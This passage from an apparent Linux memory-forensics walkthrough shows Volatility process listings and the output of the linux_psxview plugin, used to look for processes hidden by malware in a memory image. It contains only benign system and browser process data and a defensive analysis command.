0xffff9e008450c500 unattended-upgr      1354            1               0               0      0x000000002effe000 2020-04-15 02:51:05 UTC+0000
0xffff9e0084508000 sddm                 1356            1               0               0      0x000000002e054000 2020-04-15 02:51:05 UTC+0000
0xffff9e006e1cdc00 Xorg                 1371            1356            0               0      0x000000002e176000 2020-04-15 02:51:05 UTC+0000
0xffff9e006aaf2e00 whoopsie             1432            1               115             122    0x0000000024222000 2020-04-15 02:51:06 UTC+0000
0xffff9e007c588000 kerneloops           1438            1               112             4      0x0000000030d48000 2020-04-15 02:51:06 UTC+0000
0xffff9e00643c8000 kerneloops           1443            1               112             4      0x00000000243ba000 2020-04-15 02:51:06 UTC+0000
0xffff9e006e1c9700 sddm-helper          1558            1356            0               0      0x000000002aa46000 2020-04-15 02:51:07 UTC+0000
0xffff9e0070cedc00 systemd              1574            1               999             999    0x00000000212bc000 2020-04-15 02:51:08 UTC+0000
0xffff9e006e26dc00 (sd-pam)             1575            1574            999             999    0x00000000211f0000 2020-04-15 02:51:08 UTC+0000
0xffff9e00610d1700 pulseaudio           1598            1574            999             999    0x000000001ecfe000 2020-04-15 02:51:08 UTC+0000
0xffff9e006e26ae00 lxqt-session         1600            1558            999             999    0x000000001c8b2000 2020-04-15 02:51:08 UTC+0000
0xffff9e00610d4500 dbus-daemon          1613            1574            999             999    0x000000001ed16000 2020-04-15 02:51:08 UTC+0000
0xffff9e0070cec500 rtkit-daemon         1622            1               109             115    0x000000001efec000 2020-04-15 02:51:08 UTC+0000
0xffff9e005ed64500 ssh-agent            1644            1600            999             999    0x0000000030ed6000 2020-04-15 02:51:09 UTC+0000
0xffff9e006e268000 bluetoothd           1659            1               0               0      0x000000001c8c0000 2020-04-15 02:51:09 UTC+0000
0xffff9e005ec6ae00 openbox              1675            1600            999             999    0x0000000045d0c000 2020-04-15 02:51:10 UTC+0000
0xffff9e006e39dc00 at-spi-bus-laun      1678            1               999             999    0x0000000024326000 2020-04-15 02:51:11 UTC+0000
0xffff9e005ec69700 agent                1684            1               999             999    0x0000000045d1c000 2020-04-15 02:51:11 UTC+0000
0xffff9e005c83ae00 dbus-daemon          1685            1678            999             999    0x000000001cbec000 2020-04-15 02:51:11 UTC+0000
0xffff9e0056092e00 pcmanfm-qt           1691            1600            999             999    0x000000001608e000 2020-04-15 02:51:11 UTC+0000
0xffff9e0056094500 lxqt-globalkeys      1692            1600            999             999    0x0000000016198000 2020-04-15 02:51:11 UTC+0000
0xffff9e0056095c00 lxqt-notificati      1693            1600            999             999    0x000000001613c000 2020-04-15 02:51:11 UTC+0000
0xffff9e00613c0000 gvfsd                1696            1574            999             999    0x0000000016222000 2020-04-15 02:51:11 UTC+0000
0xffff9e0056090000 lxqt-panel           1697            1600            999             999    0x0000000016236000 2020-04-15 02:51:11 UTC+0000
0xffff9e00612f8000 gvfsd-fuse           1702            1574            999             999    0x0000000016054000 2020-04-15 02:51:11 UTC+0000
0xffff9e005ed65c00 lxqt-policykit-      1704            1600            999             999    0x00000000161d8000 2020-04-15 02:51:11 UTC+0000
0xffff9e005ed62e00 lxqt-runner          1710            1600            999             999    0x0000000016148000 2020-04-15 02:51:11 UTC+0000
0xffff9e006e399700 xscreensaver         1714            1               999             999    0x0000000016234000 2020-04-15 02:51:11 UTC+0000
0xffff9e00562eae00 applet.py            1717            1               999             999    0x000000001633c000 2020-04-15 02:51:11 UTC+0000
0xffff9e0056261700 gvfsd-trash          1744            1696            999             999    0x000000002ed1c000 2020-04-15 02:51:11 UTC+0000
0xffff9e0053c65c00 gvfs-udisks2-vo      1753            1574            999             999    0x000000002ec8a000 2020-04-15 02:51:12 UTC+0000
0xffff9e0053c64500 gvfs-mtp-volume      1758            1574            999             999    0x0000000013d4e000 2020-04-15 02:51:12 UTC+0000
0xffff9e0053d60000 gvfs-gphoto2-vo      1762            1574            999             999    0x0000000013d70000 2020-04-15 02:51:12 UTC+0000
0xffff9e0053d65c00 gvfs-goa-volume      1766            1574            999             999    0x0000000013dc4000 2020-04-15 02:51:12 UTC+0000
0xffff9e0053deae00 gvfs-afc-volume      1770            1574            999             999    0x0000000013e32000 2020-04-15 02:51:12 UTC+0000
0xffff9e0053dec500 gvfsd-metadata       1781            1574            999             999    0x0000000013eaa000 2020-04-15 02:51:12 UTC+0000
0xffff9e0070ce8000 upowerd              1784            1               0               0      0x0000000013ff2000 2020-04-15 02:51:12 UTC+0000
0xffff9e00563f5c00 lxqt-powermanag      1803            1600            999             999    0x000000000be0e000 2020-04-15 02:51:13 UTC+0000
0xffff9e00563f2e00 qlipper              1805            1               999             999    0x000000000bdca000 2020-04-15 02:51:13 UTC+0000
0xffff9e00562e8000 nm-tray              1807            1               999             999    0x000000000bc42000 2020-04-15 02:51:13 UTC+0000
0xffff9e0091c88000 packagekitd          6867            1               0               0      0x0000000047ed2000 2020-04-15 02:52:16 UTC+0000
0xffff9e006aaf0000 kworker/1:5          7035            2               0               0      ------------------ 2020-04-15 02:53:19 UTC+0000
0xffff9e006aaf1700 kworker/1:6          7045            2               0               0      ------------------ 2020-04-15 02:53:19 UTC+0000
0xffff9e006aaf4500 kworker/1:7          7047            2               0               0      ------------------ 2020-04-15 02:53:19 UTC+0000
0xffff9e0040122e00 vmtoolsd             7063            1               0               0      0x0000000001482000 2020-04-15 02:53:19 UTC+0000
0xffff9e004174dc00 VGAuthService        7193            1               0               0      0x00000000210b8000 2020-04-15 02:53:21 UTC+0000
0xffff9e0088250000 firefox              8595            1               999             999    0x00000000229fa000 2020-04-15 02:55:27 UTC+0000
0xffff9e0062a0dc00 IPC Launch #1        8663            8595            999             999    ------------------ 2020-04-15 02:55:31 UTC+0000
0xffff9e0062a49700 IPC Launch #1        8672            8595            999             999    ------------------ 2020-04-15 02:55:32 UTC+0000
0xffff9e0062b9ae00 IPC Launch #1        8696            8595            999             999    ------------------ 2020-04-15 02:55:32 UTC+0000
```

Mhmm. Let's think about malwares. Naturally, they will want to hide their activities, and thus will they hide their process too! Luckily, we have the command `linux_psxview` which will help us detect any **hidden processes**. <u>Note:</u> Although this plugin is not shown in the documentation, it actually does exist.



```bash
python vol.py --plugin=profile -f UMDJared2.vmem --profile=LinuxUMDProfilex64 linux_psxview

Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID pslist psscan pid_hash kmem_cache parents leaders
------------------ -------------------- ------ ------ ------ -------- ---------- ------- -------
INFO    : volatility.debug    : SLUB is currently unsupported.
0x000000004b7eae00 systemd                   1 True   True   True     False      True    True
0x000000004b7e9700 kthreadd                  2 True   True   True     False      True    True
0x000000004b7ec500 rcu_gp                    3 True   True   True     False      False   True
0x000000004b7edc00 rcu_par_gp                4 True   True   True     False      False   True
0x000000004b7e8000 kworker/0:0               5 True   True   True     False      False   True
0x000000004ac0dc00 kworker/0:0H              6 True   True   True     False      False   True
0x000000004ac0ae00 mm_percpu_wq              8 True   True   True     False      False   True
0x000000004ac09700 ksoftirqd/0               9 True   True   True     False      False   True
0x000000004ac0c500 rcu_sched                10 True   True   True     False      False   True
0x000000004ac10000 migration/0              11 True   True   True     False      False   True
0x000000004ac12e00 idle_inject/0            12 True   True   True     False      False   True
0x000000004ac11700 kworker/0:1              13 True   True   True     False      False   True
0x000000004afa2e00 cpuhp/0                  14 True   True   True     False      False   True
0x000000004afa1700 cpuhp/1                  15 True   True   True     False      False   True
0x000000004afa4500 idle_inject/1            16 True   True   True     False      False   True
0x000000004afa5c00 migration/1              17 True   True   True     False      False   True
0x000000004afa0000 ksoftirqd/1              18 True   True   True     False      False   True
0x000000004afadc00 kworker/1:0              19 True   True   True     False      False   True
0x000000004afa8000 kworker/1:0H             20 True   True   True     False      False   True
0x000000004afaae00 kdevtmpfs                21 True   True   True     False      False   True
0x000000004afa9700 netns                    22 True   True   True     False      False   True
0x000000004a88c500 rcu_tasks_kthre          23 True   True   True     False      False   True
0x000000004a88dc00 kauditd                  24 True   True   True     False      False   True
0x000000004afac500 kworker/1:1              25 True   True   True     False      False   True
0x000000004a8d2e00 kworker/1:2              26 True   True   True     False      False   True
0x000000004a88ae00 khungtaskd               28 True   True   True     False      False   True
0x000000004a8d1700 oom_reaper               29 True   True   True     False      False   True
0x000000004a8d4500 writeback                30 True   True   True     False      False   True
0x000000004a889700 kcompactd0               31 True   True   True     False      False   True
0x000000004a8d5c00 ksmd                     32 True   True   True     False      False   True
0x000000004a8d0000 khugepaged               33 True   True   True     False      False   True
0x000000004a998000 kintegrityd             125 True   True   True     False      False   True
0x000000004a9bdc00 kblockd                 126 True   True   True     False      False   True
0x000000004a9b9700 blkcg_punt_bio          127 True   True   True     False      False   True
0x000000004a9bae00 tpm_dev_wq              128 True   True   True     False      False   True
0x000000004a9b8000 ata_sff                 129 True   True   True     False      False   True
0x000000004a99ae00 md                      130 True   True   True     False      False   True
0x000000004a99c500 edac-poller             131 True   True   True     False      False   True
0x000000004a99dc00 devfreq_wq              132 True   True   True     False      False   True
0x000000004a9bc500 watchdogd               133 True   True   True     False      False   True
0x000000004a9ddc00 kswapd0                 136 True   True   True     False      False   True
0x000000004a9d9700 kworker/u257:0          137 True   True   True     False      False   True
0x000000004a9a0000 ecryptfs-kthrea         138 True   True   True     False      False   True
0x000000004a9dc500 kthrotld                141 True   True   True     False      False   True
0x000000004a9a4500 irq/24-pciehp           142 True   True   True     False      False   True
0x000000004a92ae00 irq/25-pciehp           143 True   True   True     False      False   True
0x000000004a92dc00 irq/26-pciehp           144 True   True   True     False      False   True
0x000000004a92c500 irq/27-pciehp           145 True   True   True     False      False   True
0x000000004a929700 irq/28-pciehp           146 True   True   True     False      False   True
0x000000004a9dae00 irq/29-pciehp           147 True   True   True     False      False   True
0x000000004a944500 irq/30-pciehp           148 True   True   True     False      False   True
0x000000004a940000 irq/31-pciehp           149 True   True   True     False      False   True
0x000000004a942e00 irq/32-pciehp           150 True   True   True     False      False   True
0x000000004a945c00 irq/33-pciehp           151 True   True   True     False      False   True
0x000000004a941700 irq/34-pciehp           152 True   True   True     False      False   True
0x000000004a9c8000 irq/35-pciehp           153 True   True   True     False      False   True
0x000000004a9cdc00 irq/36-pciehp           154 True   True   True     False      False   True
0x000000004a9c9700 irq/37-pciehp           155 True   True   True     False      False   True
0x000000004a9cae00 irq/38-pciehp           156 True   True   True     False      False   True
0x000000004a9cc500 irq/39-pciehp           157 True   True   True     False      False   True
0x000000004a9c1700 irq/40-pciehp           158 True   True   True     False      False   True
0x000000004a9c0000 irq/41-pciehp           159 True   True   True     False      False   True
0x000000004a9c4500 irq/42-pciehp           160 True   True   True     False      False   True
0x000000004a9c2e00 irq/43-pciehp           161 True   True   True     False      False   True
0x000000004a9c5c00 irq/44-pciehp           162 True   True   True     False      False   True
0x000000004a9b0000 irq/45-pciehp           163 True   True   True     False      False   True
0x000000004a9b4500 irq/46-pciehp           164 True   True   True     False      False   True
0x000000004a9b2e00 irq/47-pciehp           165 True   True   True     False      False   True
0x000000004a9b5c00 irq/48-pciehp           166 True   True   True     False      False   True
0x000000004a9b1700 irq/49-pciehp           167 True   True   True     False      False   True
0x000000004a995c00 irq/50-pciehp           168 True   True   True     False      False   True
0x000000004a994500 irq/51-pciehp           169 True   True   True     False      False   True
0x000000004a991700 irq/52-pciehp           170 True   True   True     False      False   True
0x000000004a990000 irq/53-pciehp           171 True   True   True     False      False   True
0x000000004a992e00 irq/54-pciehp           172 True   True   True     False      False   True
0x000000004a9aae00 irq/55-pciehp           173 True   True   True     False      False   True
0x000000004a9a8000 acpi_thermal_pm         174 True   True   True     False      False   True
0x000000004a9a2e00 scsi_eh_0               175 True   True   True     False      False   True
0x000000004a9a5c00 scsi_tmf_0              176 True   True   True     False      False   True
0x000000004a9a1700 scsi_eh_1               177 True   True   True     False      False   True
0x000000004a9d8000 scsi_tmf_1              178 True   True   True     False      False   True
0x000000004a999700 ipv6_addrconf           180 True   True   True     False      False   True
0x0000000053da5c00 kstrp                   192 True   True   True     False      False   True
0x0000000053da4500 charger_manager         211 True   True   True     False      False   True
0x0000000053e24500 scsi_eh_2               246 True   True   True     False      False   True
0x0000000053d94500 scsi_tmf_2              247 True   True   True     False      False   True
0x0000000053e22e00 mpt_poll_0              248 True   True   True     False      False   True
0x0000000053e20000 scsi_eh_3               249 True   True   True     False      False   True
0x0000000053d59700 scsi_tmf_3              250 True   True   True     False      False   True
0x0000000053e25c00 mpt/0                   251 True   True   True     False      False   True
0x0000000053d58000 scsi_eh_4               252 True   True   True     False      False   True
0x0000000053d5c500 scsi_tmf_4              253 True   True   True     False      False   True
0x0000000053d5dc00 scsi_eh_5               254 True   True   True     False      False   True
0x0000000053d5ae00 irq/16-vmwgfx           255 True   True   True     False      False   True
0x000000004a9ac500 scsi_tmf_5              256 True   True   True     False      False   True
0x0000000053e88000 ttm_swap                257 True   True   True     False      False   True
0x0000000053dd0000 scsi_eh_6               258 True   True   True     False      False   True
0x0000000053e49700 scsi_tmf_6              259 True   True   True     False      False   True
0x0000000053e4ae00 scsi_eh_7               260 True   True   True     False      False   True
0x0000000053da2e00 cryptd                  261 True   True   True     False      False   True
0x0000000053e48000 scsi_tmf_7              262 True   True   True     False      False   True
0x00000000527b5c00 scsi_eh_8               265 True   True   True     False      False   True
0x00000000527b0000 scsi_tmf_8              266 True   True   True     False      False   True
0x00000000527b2e00 scsi_eh_9               267 True   True   True     False      False   True
0x00000000527b1700 scsi_tmf_9              269 True   True   True     False      False   True
0x0000000053e4c500 scsi_eh_10              271 True   True   True     False      False   True
0x0000000053e4dc00 scsi_tmf_10             272 True   True   True     False      False   True
0x0000000053da1700 scsi_eh_11              274 True   True   True     False      False   True
0x00000000521cdc00 scsi_tmf_11             276 True   True   True     False      False   True
0x00000000521cae00 scsi_eh_12              278 True   True   True     False      False   True
0x00000000521c9700 scsi_tmf_12             279 True   True   True     False      False   True
0x00000000521cc500 scsi_eh_13              281 True   True   True     False      False   True
0x00000000521fae00 scsi_tmf_13             285 True   True   True     False      False   True
0x00000000521f9700 scsi_eh_14              286 True   True   True     False      False   True
0x0000000052214500 scsi_tmf_14             287 True   True   True     False      False   True
0x0000000052210000 scsi_eh_15              289 True   True   True     False      False   True
0x0000000052224500 scsi_tmf_15             292 True   True   True     False      False   True
0x0000000052225c00 scsi_eh_16              293 True   True   True     False      False   True
0x0000000052220000 scsi_tmf_16             294 True   True   True     False      False   True
0x0000000052222e00 scsi_eh_17              295 True   True   True     False      False   True
0x0000000052221700 scsi_tmf_17             296 True   True   True     False      False   True
0x00000000521fc500 scsi_eh_18              297 True   True   True     False      False   True
0x00000000521c8000 scsi_tmf_18             298 True   True   True     False      False   True
0x000000005229ae00 scsi_eh_19              299 True   True   True     False      False   True
0x0000000052299700 scsi_tmf_19             300 True   True   True     False      False   True
0x00000000521b0000 scsi_eh_20              301 True   True   True     False      False   True
0x00000000521b5c00 scsi_tmf_20             302 True   True   True     False      False   True
0x00000000521b1700 scsi_eh_21              303 True   True   True     False      False   True
0x00000000521b4500 scsi_tmf_21             304 True   True   True     False      False   True
0x00000000521b2e00 scsi_eh_22              305 True   True   True     False      False   True
0x00000000527b4500 scsi_tmf_22             306 True   True   True     False      False   True
0x00000000522d5c00 scsi_eh_23              307 True   True   True     False      False   True
0x00000000522d0000 scsi_tmf_23             308 True   True   True     False      False   True
0x00000000522d2e00 scsi_eh_24              309 True   True   True     False      False   True
0x00000000522d1700 scsi_tmf_24             310 True   True   True     False      False   True
0x00000000522d4500 scsi_eh_25              311 True   True   True     False      False   True
0x0000000052330000 scsi_tmf_25             312 True   True   True     False      False   True
0x0000000052332e00 scsi_eh_26              313 True   True   True     False      False   True
0x0000000052331700 scsi_tmf_26             314 True   True   True     False      False   True
0x0000000052334500 scsi_eh_27              315 True   True   True     False      False   True
0x0000000052335c00 scsi_tmf_27             316 True   True   True     False      False   True
0x000000005236c500 scsi_eh_28              317 True   True   True     False      False   True
0x000000005236dc00 scsi_tmf_28             318 True   True   True     False      False   True
0x0000000052368000 scsi_eh_29              319 True   True   True     False      False   True
0x000000005236ae00 scsi_tmf_29             320 True   True   True     False      False   True
0x0000000052369700 scsi_eh_30              321 True   True   True     False      False   True
0x000000005238dc00 scsi_tmf_30             322 True   True   True     False      False   True
0x0000000052388000 scsi_eh_31              323 True   True   True     False      False   True
0x000000005238ae00 scsi_tmf_31             324 True   True   True     False      False   True
0x0000000051c10000 kworker/u256:26         347 True   True   True     False      False   True
0x0000000051c12e00 kworker/u256:27         348 True   True   True     False      False   True
0x0000000051c6c500 kworker/u256:28         349 True   True   True     False      False   True
0x0000000051c6dc00 kworker/u256:29         350 True   True   True     False      False   True
0x0000000051c81700 kworker/0:3             371 True   True   True     False      False   True
0x0000000051c71700 scsi_eh_32              375 True   True   True     False      False   True
0x0000000051c70000 scsi_tmf_32             376 True   True   True     False      False   True
0x0000000051c72e00 kworker/1:1H            377 True   True   True     False      False   True
0x0000000051c74500 kworker/0:1H            382 True   True   True     False      False   True
0x0000000051c80000 loop0                   477 True   True   True     False      False   True
0x0000000053d95c00 systemd-journal         968 True   True   True     False      False   True
0x0000000053d90000 kworker/1:3             973 True   True   True     False      False   True
0x0000000053d91700 kworker/1:4             974 True   True   True     False      False   True
0x00000000515b0000 systemd-udevd           980 True   True   True     False      False   True
0x0000000053d92e00 kworker/0:4             983 True   True   True     False      False   True
0x00000000515b2e00 haveged                1025 True   True   True     False      False   True
0x00000000515b1700 systemd-timesyn        1026 True   True   True     False      False   True
0x0000000052298000 systemd-resolve        1028 True   True   True     False      False   True
0x000000005229c500 kworker/0:5            1029 True   True   True     False      False   True
0x0000000051c8ae00 cron                   1198 True   True   True     False      False   True
0x0000000051c8c500 systemd-logind         1199 True   True   True     False      False   True
0x0000000052211700 dbus-daemon            1201 True   True   True     False      False   True
0x0000000052215c00 udisksd                1202 True   True   True     False      False   True
0x0000000053e8dc00 cupsd                  1206 True   True   True     False      False   True
0x0000000053e89700 acpid                  1207 True   True   True     False      False   True
0x0000000053e8c500 NetworkManager         1208 True   True   True     False      False   True
0x0000000053dd2e00 ModemManager           1210 True   True   True     False      False   True
0x0000000053dd5c00 rsyslogd               1211 True   True   True     False      False   True
0x0000000053dd4500 wpa_supplicant         1212 True   True   True     False      False   True
0x0000000051c85c00 ofonod                 1215 True   True   True     False      False   True
0x0000000051c69700 irqbalance             1222 True   True   True     False      False   True
0x000000004450ae00 accounts-daemon        1223 True   True   True     False      False   True
0x0000000044509700 avahi-daemon           1225 True   True   True     False      True    True
0x000000004450dc00 networkd-dispat        1230 True   True   True     False      False   True
0x0000000051c84500 avahi-daemon           1278 True   True   True     False      False   True
0x000000003c58ae00 cups-browsed           1282 True   True   True     False      False   True
0x0000000052212e00 polkitd                1298 True   True   True     False      False   True
0x000000004450c500 unattended-upgr        1354 True   True   True     False      False   True
0x0000000044508000 sddm                   1356 True   True   True     False      True    True
0x000000002e1cdc00 Xorg                   1371 True   True   True     False      False   True
0x000000002aaf2e00 whoopsie               1432 True   True   True     False      False   True
0x000000003c588000 kerneloops             1438 True   True   True     False      False   True
0x00000000243c8000 kerneloops             1443 True   True   True     False      False   True
0x000000002e1c9700 sddm-helper            1558 True   True   True     False      True    True
0x0000000030cedc00 systemd                1574 True   True   True     False      True    True
0x000000002e26dc00 (sd-pam)               1575 True   True   True     False      False   True
0x00000000210d1700 pulseaudio             1598 True   True   True     False      False   True
0x000000002e26ae00 lxqt-session           1600 True   True   True     False      True    True
0x00000000210d4500 dbus-daemon            1613 True   True   True     False      False   True
0x0000000030cec500 rtkit-daemon           1622 True   True   True     False      False   True
0x000000001ed64500 ssh-agent              1644 True   True   True     False      False   True
0x000000002e268000 bluetoothd             1659 True   True   True     False      False   True
0x000000001ec6ae00 openbox                1675 True   True   True     False      False   True
0x000000002e39dc00 at-spi-bus-laun        1678 True   True   True     False      True    True
0x000000001ec69700 agent                  1684 True   True   True     False      False   True
0x000000001c83ae00 dbus-daemon            1685 True   True   True     False      False   True
0x0000000016092e00 pcmanfm-qt             1691 True   True   True     False      False   True
0x0000000016094500 lxqt-globalkeys        1692 True   True   True     False      False   True
0x0000000016095c00 lxqt-notificati        1693 True   True   True     False      False   True
0x00000000213c0000 gvfsd                  1696 True   True   True     False      True    True
0x0000000016090000 lxqt-panel             1697 True   True   True     False      False   True
0x00000000212f8000 gvfsd-fuse             1702 True   True   True     False      False   True
0x000000001ed65c00 lxqt-policykit-        1704 True   True   True     False      False   True
0x000000001ed62e00 lxqt-runner            1710 True   True   True     False      False   True
0x000000002e399700 xscreensaver           1714 True   True   True     False      False   True
0x00000000162eae00 applet.py              1717 True   True   True     False      False   True
0x0000000016261700 gvfsd-trash            1744 True   True   True     False      False   True
0x0000000013c65c00 gvfs-udisks2-vo        1753 True   True   True     False      False   True
0x0000000013c64500 gvfs-mtp-volume        1758 True   True   True     False      False   True
0x0000000013d60000 gvfs-gphoto2-vo        1762 True   True   True     False      False   True
0x0000000013d65c00 gvfs-goa-volume        1766 True   True   True     False      False   True
0x0000000013deae00 gvfs-afc-volume        1770 True   True   True     False      False   True
0x0000000013dec500 gvfsd-metadata         1781 True   True   True     False      False   True
0x0000000030ce8000 upowerd                1784 True   True   True     False      False   True
0x00000000163f5c00 lxqt-powermanag        1803 True   True   True     False      False   True
0x00000000163f2e00 qlipper                1805 True   True   True     False      False   True
0x00000000162e8000 nm-tray                1807 True   True   True     False      False   True
0x0000000051c88000 packagekitd            6867 True   True   True     False      False   True
0x000000002aaf0000 kworker/1:5            7035 True   True   True     False      False   True
0x000000002aaf1700 kworker/1:6            7045 True   True   True     False      False   True
0x000000002aaf4500 kworker/1:7            7047 True   True   True     False      False   True
0x0000000000122e00 vmtoolsd               7063 True   True   True     False      False   True
0x000000000174dc00 VGAuthService          7193 True   True   True     False      False   True
0x0000000048250000 firefox                8595 True   True   True     False      True    True
0x0000000022a0dc00 IPC Launch #1          8663 True   True   True     False      False   True
0x0000000022a49700 IPC Launch #1          8672 True   True   True     False      False   True
0x0000000022b9ae00 IPC Launch #1          8696 True   True   True     False      False   True
0x0000000051c89700 sd-resolve             1197 False  True   True     False      False   False
0x000000005229dc00 gmain                  1216 False  True   True     False      False   False
0x0000000045dfae00 gdbus                  1218 False  True   True     False      False   False
0x00000000515b5c00 gmain                  1241 False  True   True     False      False   False
0x000000003c7d2e00 gdbus                  1243 False  True   True     False      False   False
0x0000000051c75c00 gmain                  1261 False  True   True     False      False   False
0x0000000053e21700 in:imuxsock            1279 False  True   True     False      False   False
0x000000003fd81700 in:imklog              1280 False  True   True     False      False   False
0x000000003fd89700 rs:main Q:Reg          1281 False  True   True     False      False   False
0x0000000044494500 gmain                  1290 False  True   True     False      False   False
0x000000003c58c500 gdbus                  1292 False  True   True     False      False   False
0x0000000044495c00 gmain                  1303 False  True   True     False      False   False
0x000000003c8f1700 gdbus                  1305 False  True   True     False      False   False
0x0000000045dd9700 probing-thread         1307 False  True   True     False      False   False
0x0000000053dd1700 gmain                  1309 False  True   True     False      False   False
0x000000003ca65c00 gdbus                  1310 False  True   True     False      False   False
0x0000000045dd8000 cleanup                1311 False  True   True     False      False   False
0x000000003c58dc00 gmain                  1312 False  True   True     False      False   False
0x000000003fc72e00 gdbus                  1313 False  True   True     False      False   False
0x0000000044492e00 gmain                  1368 False  True   True     False      False   False
0x000000002e1cc500 QDBusConnection        1369 False  True   True     False      False   False
0x0000000030ce9700 gmain                  1452 False  True   True     False      False   False
0x00000000228cae00 gdbus                  1453 False  True   True     False      False   False
0x000000002e1c8000 InputThread            1554 False  True   True     False      False   False
0x000000002e269700 rtkit-daemon           1623 False  True   True     False      False   False
0x000000001c825c00 rtkit-daemon           1624 False  True   True     False      False   False
0x00000000213c4500 alsa-sink-ES137        1657 False  True   True     False      False   False
0x00000000210d0000 alsa-source-ES1        1658 False  True   True     False      False   False
0x00000000213c1700 snapd-glib             1660 False  True   True     False      False   False
0x000000002e39ae00 QXcbEventQueue         1664 False  True   True     False      False   False
0x000000002e39c500 QDBusConnection        1669 False  True   True     False      False   False
0x000000001c83c500 gmain                  1680 False  True   True     False      False   False
0x000000001c838000 dconf worker           1681 False  True   True     False      False   False
0x000000001c839700 gdbus                  1683 False  True   True     False      False   False
0x000000001ec6c500 gmain                  1686 False  True   True     False      False   False
0x000000002e398000 gdbus                  1688 False  True   True     False      False   False
0x000000001ec6dc00 gmain                  1694 False  True   True     False      False   False
0x000000001ed60000 gdbus                  1695 False  True   True     False      False   False
0x00000000213c2e00 gmain                  1698 False  True   True     False      False   False
0x00000000213c5c00 gdbus                  1699 False  True   True     False      False   False
0x00000000212fc500 gvfsd-fuse             1705 False  True   True     False      False   False
0x00000000212fae00 gvfsd-fuse             1706 False  True   True     False      False   False
0x0000000016262e00 gmain                  1707 False  True   True     False      False   False
0x0000000016265c00 gdbus                  1708 False  True   True     False      False   False
0x0000000016264500 gvfs-fuse-sub          1709 False  True   True     False      False   False
0x0000000016091700 QXcbEventQueue         1711 False  True   True     False      False   False
0x00000000162e9700 QXcbEventQueue         1713 False  True   True     False      False   False
0x00000000162edc00 QXcbEventQueue         1715 False  True   True     False      False   False
0x00000000162d9700 QXcbEventQueue         1734 False  True   True     False      False   False
0x00000000162ddc00 QXcbEventQueue         1735 False  True   True     False      False   False
0x00000000162dae00 QXcbEventQueue         1736 False  True   True     False      False   False
0x000000001ed7c500 QDBusConnection        1737 False  True   True     False      False   False
0x000000001ed78000 QDBusConnection        1738 False  True   True     False      False   False
0x000000001ed79700 Core                   1739 False  True   True     False      False   False
0x000000001ed7dc00 QDBusConnection        1740 False  True   True     False      False   False
0x000000001ed7ae00 gmain                  1741 False  True   True     False      False   False
0x0000000013c15c00 gdbus                  1742 False  True   True     False      False   False
0x0000000013c12e00 QDBusConnection        1743 False  True   True     False      False   False
0x0000000016260000 gmain                  1745 False  True   True     False      False   False
0x0000000013c14500 QDBusConnection        1746 False  True   True     False      False   False
0x00000000212fdc00 gdbus                  1747 False  True   True     False      False   False
0x00000000162dc500 QDBusConnection        1750 False  True   True     False      False   False
0x0000000013c10000 gmain                  1751 False  True   True     False      False   False
0x0000000013c11700 gdbus                  1752 False  True   True     False      False   False
0x00000000210d5c00 gmain                  1754 False  True   True     False      False   False
0x000000002126c500 gdbus                  1755 False  True   True     False      False   False
0x000000002126dc00 dconf worker           1756 False  True   True     False      False   False
0x0000000013c61700 gmain                  1759 False  True   True     False      False   False
0x000000002126ae00 gdbus                  1761 False  True   True     False      False   False
0x0000000021269700 gmain                  1763 False  True   True     False      False   False
0x0000000013d62e00 gdbus                  1765 False  True   True     False      False   False
0x0000000013d64500 gmain                  1767 False  True   True     False      False   False
0x0000000013d61700 gdbus                  1768 False  True   True     False      False   False
0x0000000013d78000 gvfs-afc-volume        1771 False  True   True     False      False   False
0x0000000013d7ae00 gmain                  1772 False  True   True     False      False   False
0x0000000013dedc00 gdbus                  1774 False  True   True     False      False   False
0x0000000013de9700 gmain                  1782 False  True   True     False      False   False
0x0000000013f11700 gdbus                  1783 False  True   True     False      False   False
0x0000000013fe2e00 gmain                  1786 False  True   True     False      False   False
0x0000000013fe4500 gdbus                  1787 False  True   True     False      False   False
0x00000000163f4500 threaded-ml            1797 False  True   True     False      False   False
0x00000000162ec500 QXcbEventQueue         1808 False  True   True     False      False   False
0x00000000163f0000 QXcbEventQueue         1809 False  True   True     False      False   False
0x000000000bf5dc00 QXcbEventQueue         1810 False  True   True     False      False   False
0x000000000bf5ae00 QDBusConnection        1811 False  True   True     False      False   False
0x000000001ed61700 QDBusConnection        1812 False  True   True     False      False   False
0x000000000bf5c500 QDBusConnection        1813 False  True   True     False      False   False
0x0000000030ceae00 gmain                  6876 False  True   True     False      False   False
0x0000000002138000 gdbus                  6877 False  True   True     False      False   False
0x0000000001088000 gmain                  7111 False  True   True     False      False   False
0x00000000229e9700 Gecko_IOThread         8600 False  True   True     False      False   False
0x00000000229eae00 JS Watchdog            8601 False  True   True     False      False   False
0x00000000229ec500 JS Helper              8602 False  True   True     False      False   False
0x00000000229e8000 JS Helper              8603 False  True   True     False      False   False
0x00000000229edc00 Timer                  8604 False  True   True     False      False   False
0x000000001ec68000 Link Monitor           8605 False  True   True     False      False   False
0x000000001c83dc00 Socket Thread          8606 False  True   True     False      False   False
0x0000000048255c00 AudioIPC Callba        8607 False  True   True     False      False   False
0x00000000163f1700 AudioIPC Callba        8608 False  True   True     False      False   False
0x0000000048251700 AudioIPC Server        8609 False  True   True     False      False   False
0x0000000048252e00 AudioIPC Server        8610 False  True   True     False      False   False
0x00000000229dae00 gmain                  8612 False  True   True     False      False   False
0x00000000229d9700 gdbus                  8613 False  True   True     False      False   False
0x000000000bf59700 firefox                8614 False  True   True     False      False   False
0x00000000229ddc00 Cache2 I/O             8618 False  True   True     False      False   False
0x00000000229d8000 Cookie                 8619 False  True   True     False      False   False
0x000000000f7bdc00 DOM Worker             8621 False  True   True     False      False   False
0x000000000f7bc500 IPDL Background        8622 False  True   True     False      False   False
0x00000000229f4500 GMPThread              8634 False  True   True     False      False   False
0x00000000229f0000 Worker Launcher        8635 False  True   True     False      False   False
0x0000000009db4500 Softwar~cThread        8636 False  True   True     False      False   False
0x0000000009db0000 Compositor             8637 False  True   True     False      False   False
0x0000000022a0c500 ImgDecoder #1          8638 False  True   True     False      False   False
0x0000000022a08000 ImageIO                8639 False  True   True     False      False   False
0x000000000f7bae00 ImageBr~geChild        8643 False  True   True     False      False   False
0x000000000f7b9700 mozStorage #1          8644 False  True   True     False      False   False
0x000000002a80dc00 QuotaManager IO        8645 False  True   True     False      False   False
0x000000002a80ae00 mozStorage #2          8646 False  True   True     False      False   False
0x0000000009db1700 DOM Worker             8656 False  True   True     False      False   False
0x0000000009db5c00 Breakpad Server        8657 False  True   True     False      False   False
0x0000000009db2e00 firefox                8658 False  True   True     False      False   False
